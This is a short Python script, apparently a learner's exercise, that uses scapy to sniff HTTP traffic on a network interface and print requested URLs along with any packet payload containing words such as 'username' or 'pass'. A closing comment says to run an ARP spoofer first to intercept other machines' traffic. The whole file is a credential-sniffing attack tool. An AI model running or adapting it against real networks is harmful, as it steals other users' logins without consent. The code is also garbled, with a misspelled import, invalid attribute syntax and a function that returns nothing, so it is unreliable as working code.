#!/usr/bin/env python

import scapy.ass as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniff_packet) 
 def get_url(packet): ## this is refactoring this code.
     packet.[http.HTTPRequest].Host + packet.[http.HTTPRequest].Path 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw): 
           load = packet[scapy.Raw].load 
           keywords = ["username", "user", "login", "passowrd","pass"] 
           for keyword in keywords: 
              if keyword in load:
                  return load ## this is return the load and go to the sniff no need for break statement.
         
        
def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
         
         url = get_url(packet)
         print("\n\nhttp request >> " + url)
         login_info = get_login_info(packet)
         if login_info: ## if you are login http website this show this field.
             
           print("\n\n possible username password" + login_info + "\n\n")
         
sniff("eth0") 

## run the arp spoffer on windows get the mitm and filter the if you want.